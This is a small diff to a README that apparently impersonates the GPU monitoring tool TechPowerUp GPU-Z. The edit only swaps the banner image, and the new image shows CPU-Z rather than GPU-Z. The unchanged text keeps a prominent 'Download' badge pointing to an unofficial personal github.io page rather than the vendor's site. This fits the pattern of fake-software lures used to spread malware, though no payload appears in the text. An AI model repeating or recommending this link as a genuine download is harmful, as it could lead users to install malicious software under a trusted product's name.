@@ -2,7 +2,7 @@
 
 > TechPowerUp GPU Z is a comprehensive solution designed to deliver precise and detailed information about GPU hardware, offering deep insights into performance, temperature, and system-level graphics data.
 
-![Banner Placeholder](https://cdn2.steamgriddb.com/logo/715608d3dc19ce1d62266daee152ec19.png)
+![Banner Placeholder](https://cdn8.futura-sciences.com/a1280/logitheque/logiciel-cpu-z.jpg)
 
 [![Download TechPowerUp GPU Z](https://img.shields.io/badge/Download_TechPowerUp_GPU_Z-Now-00bfff?style=for-the-badge&logo=github&logoColor=white)](https://lucytdream01.github.io/.github/techpowerup-gpu-z)
 
